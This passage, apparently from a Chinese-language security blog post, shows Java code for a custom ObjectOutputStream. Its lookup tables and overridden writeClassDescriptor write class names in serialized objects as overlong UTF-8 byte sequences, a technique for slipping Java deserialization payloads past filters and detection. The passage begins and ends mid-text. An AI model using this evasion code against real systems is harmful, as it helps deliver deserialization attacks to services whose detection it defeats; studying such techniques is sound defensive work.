class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span><br>            <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">externalizable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">serializable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWriteObjectData</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEnum</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>);<br>        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>        System.out.println(name);<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br><br><br>        writeLong(desc.getSerialVersionUID());<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (externalizable) &#123;<br>            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">int</span> protocol;<br>            <span class="hljs-keyword">try</span> &#123;<br>                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                protocol = (<span class="hljs-type">int</span>) protocolField.get(<span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (serializable) &#123;<br>            flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (hasWriteObjectData) &#123;<br>            flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isEnum) &#123;<br>            flags |= ObjectStreamConstants.SC_ENUM;<br>        &#125;<br>        writeByte(flags);<br><br>        writeShort(fields.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>            writeByte(f.getTypeCode());<br>            writeUTF(f.getName());<br>            <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                invoke(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;writeTypeString&quot;</span>, f.getTypeString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object object, String methodName, Object... args)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);<br>            writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                writeTypeString.invoke(object, args);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Class&lt;?&gt; clazz = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            value = field.get(object);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ç« è¯„è®ºåŒºè¿˜æåˆ°äº†ï¼Œå¯ä»¥ç›´æ¥é‡å†™writeUTFæ–¹æ³•ä¼šæ›´åŠ 